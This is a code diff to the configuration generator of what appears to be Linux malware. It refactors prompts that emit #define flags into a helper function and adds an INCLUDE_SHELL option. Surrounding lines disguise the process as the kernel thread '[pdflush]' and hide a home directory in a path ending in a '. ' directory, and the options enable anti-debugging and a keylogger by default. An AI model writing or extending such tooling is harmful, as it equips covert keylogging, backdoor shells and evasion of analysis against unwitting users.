@@ -8,6 +8,33 @@
 #define DEFAULTHOME "/usr/share/zoneinfo/posix/America/Indiana/. /"
 #define PROCNAME "[pdflush]\0"
 
+void config_option(char *option, int def) {
+	char input[INPUTLENGTH];
+
+	fprintf(stderr, "[*] Enable %s? [%s]: ", option, def ? "yes" : "no" ); 
+	fflush(stderr);
+	fgets(input, INPUTLENGTH, stdin);
+	input[strlen(input) - 1] = '\0';
+
+	if (def) {
+		if (strcmp(input, "no") != 0){
+			printf("#define %s 1\n", option);
+			fprintf(stderr, " => %s enabled.\n", option);
+		} else {
+			printf("#define %s 0\n", option);
+			fprintf(stderr, " => %s disabled.\n", option);
+		}
+	} else {
+		if (strcmp(input, "yes") == 0){
+			printf("#define %s 1\n", option);
+			fprintf(stderr, " => %s enabled.\n", option);
+		} else {
+			printf("#define %s 0\n", option);
+			fprintf(stderr, " => %s disabled.\n", option);
+		}
+	}
+}
+
 int main(int argc, char *argv[]) {
 
     int i;
@@ -86,44 +113,10 @@ int main(int argc, char *argv[]) {
 		input[strlen(input) - 1] = '\0';
 	printf("#define PROCNAME \"%s\\0\"\n", input);
 
-	// Debug	
-	fprintf(stderr, "[*] Enable debuging information? [no]: "); 
-	fflush(stderr);
-	fgets(input, INPUTLENGTH, stdin);
-	input[strlen(input) - 1] = '\0';
-	if (strcmp(input, "yes") == 0){
-		printf("#define DEBUG 1\n");
-		fprintf(stderr, " => Debug enabled.\n");
-	} else {
-		printf("#define DEBUG 0\n");
-		fprintf(stderr, " => Debug disabled.\n");
-	}
-
-	// Cron
-	fprintf(stderr, "[*] Enable antidebug? [yes]: "); 
-	fflush(stderr);
-	fgets(input, INPUTLENGTH, stdin);
-	input[strlen(input) - 1] = '\0';
-	if (strcmp(input, "no") != 0){
-		printf("#define ANTIDEBUG 1\n");
-		fprintf(stderr, " => Antidebug enabled.\n");
-	} else {
-		printf("#define ANTIDEBUG 0\n");
-		fprintf(stderr, " => Antidebug disabled.\n");
-	}
-
-	// Keylogger
-	fprintf(stderr, "[*] Enable keylogger? [yes]: "); 
-	fflush(stderr);
-	fgets(input, INPUTLENGTH, stdin);
-	input[strlen(input) - 1] = '\0';
-	if (strcmp(input, "no") != 0){
-		printf("#define KEYLOGGER 1\n");
-		fprintf(stderr, " => Keylogger enabled.\n");
-	} else {
-		printf("#define KEYLOGGER 0\n");
-		fprintf(stderr, " => Keylogger disabled.\n");
-	}
+	config_option("DEBUG", 0);
+	config_option("ANTIDEBUG", 1);
+	config_option("KEYLOGGER", 1);
+	config_option("INCLUDE_SHELL", 0);
 
 	printf("#endif\n");
 
